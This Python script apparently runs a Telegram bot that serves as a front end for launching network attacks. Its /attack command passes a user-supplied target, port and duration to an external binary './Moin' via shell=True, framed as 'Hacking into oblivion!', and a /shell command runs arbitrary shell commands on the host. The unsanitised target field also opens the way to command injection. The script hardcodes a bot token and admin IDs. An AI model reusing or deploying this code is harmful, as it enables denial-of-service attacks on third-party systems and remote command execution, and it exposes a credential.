#!/usr/bin/python3
import telebot
import time
import threading
import subprocess
import logging

# Logging configuration for debugging
logging.basicConfig(level=logging.DEBUG)

# Telegram bot token
bot = telebot.TeleBot('7228305815:AAGZvYtuYd6BC1J1qYeneQFPzDa4XDW5tYQ', parse_mode="HTML")

# Admin user IDs
admin_id = ["1232047106"]

# Authorized users list
authorized_users = []

# Group and Channel details
GROUP_ID = -1002322006686  # Group ID as an integer
CHANNEL_ID = '@OWNERSRK'    # Channel ID as a string

# Cooldown tracker
user_cooldowns = {}

# Maximum duration and cooldown time
MAX_DURATION = 180
COOLDOWN_TIME = 30

# YouTube Channel Promotion
YT_PROMO = "🚀 Don't forget to subscribe to our YouTube Channel: <a href='https://www.youtube.com/@SRK'>SRK</a> for more updates!"

# Function to execute shell commands asynchronously
def execute_shell_command(command):
    try:
        process = subprocess.Popen(command, shell=True)
        return f"✅ Attack started: <code>{command}</code>"
    except Exception as e:
        return f"❌ Error executing command: {str(e)}"

# Start Command
@bot.message_handler(commands=['start'], chat_types=['private', 'group', 'supergroup'])
def start(message):
    bot.reply_to(message, f"Welcome! Type /help to see available commands.\n\nOwner: {CHANNEL_ID}")

# Help Command
@bot.message_handler(commands=['help'], chat_types=['private', 'group', 'supergroup'])
def help(message):
    bot.reply_to(message, f"""
<b>Available Commands:</b>

/start - Start the bot
/attack [target] [port] [duration] - Simulate an attack (Admins only)
/add [user_id] - Add an authorized user (Admins only)
/remove [user_id] - Remove an authorized user (Admins only)
/shell [command] - Execute a shell command (Admins only)
/help - Show this help message

Owner: {CHANNEL_ID}
""", parse_mode="HTML")

# Attack Command
@bot.message_handler(commands=['attack'], chat_types=['group', 'supergroup'])
def attack(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    args = message.text.split()[1:]
    if len(args) != 3:
        bot.reply_to(message, "❌ Invalid format! Use /attack [target] [port] [duration].")
        return

    target, port, duration = args
    try:
        duration = int(duration)
        if duration > MAX_DURATION:
            bot.reply_to(message, f"❌ Duration too long! Maximum allowed is {MAX_DURATION} seconds.")
            return
    except ValueError:
        bot.reply_to(message, "❌ Duration must be a number.")
        return

    user_id = message.from_user.id
    if user_id in user_cooldowns:
        remaining_time = round(user_cooldowns[user_id] - time.time())
        if remaining_time > 0:
            bot.reply_to(message, f"⏳ Please wait {remaining_time} seconds before starting a new attack.")
            return

    bot.reply_to(message, f"""
🔨 Hacking into oblivion!
🎯 <b>Target:</b> {target}
📜 <b>Port:</b> {port}
⏰ <b>Duration:</b> {duration} sec
    """, parse_mode="HTML")

    threading.Thread(target=start_attack, args=(message, target, port, duration)).start()
    user_cooldowns[user_id] = time.time() + COOLDOWN_TIME

def start_attack(message, target, port, duration):
    full_command = f"./Moin {target} {port} {duration}"
    result = execute_shell_command(full_command)
    bot.reply_to(message, result)

# Add User Command
@bot.message_handler(commands=['add'], chat_types=['group', 'supergroup'])
def add_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    args = message.text.split()[1:]
    if len(args) != 1:
        bot.reply_to(message, "❌ Invalid format! Use /add [user_id].")
        return

    user_id = args[0]
    if user_id not in authorized_users:
        authorized_users.append(user_id)
        bot.reply_to(message, f"✅ User {user_id} has been added successfully.")
    else:
        bot.reply_to(message, f"❌ User {user_id} is already authorized.")

# Remove User Command
@bot.message_handler(commands=['remove'], chat_types=['group', 'supergroup'])
def remove_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    args = message.text.split()[1:]
    if len(args) != 1:
        bot.reply_to(message, "❌ Invalid format! Use /remove [user_id].")
        return

    user_id = args[0]
    if user_id in authorized_users:
        authorized_users.remove(user_id)
        bot.reply_to(message, f"✅ User {user_id} has been removed successfully.")
    else:
        bot.reply_to(message, f"❌ User {user_id} is not authorized.")

# Binary Access Shell Command
@bot.message_handler(commands=['shell'], chat_types=['group', 'supergroup'])
def shell(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    args = message.text.split()[1:]
    if len(args) == 0:
        bot.reply_to(message, "❌ Invalid format! Use /shell [command].")
        return

    command = " ".join(args)
    result = execute_shell_command(command)
    bot.reply_to(message, f"🖥️ Shell command output:\n<code>{result}</code>", parse_mode="HTML")

# Fallback Handler to log all messages
@bot.message_handler(func=lambda message: True)
def log_message(message):
    logging.debug(f"Message from {message.chat.id}: {message.text}")

# Run the bot with enhanced error handling
print("Bot is running...")
bot.polling(none_stop=True, interval=0, timeout=20)
        
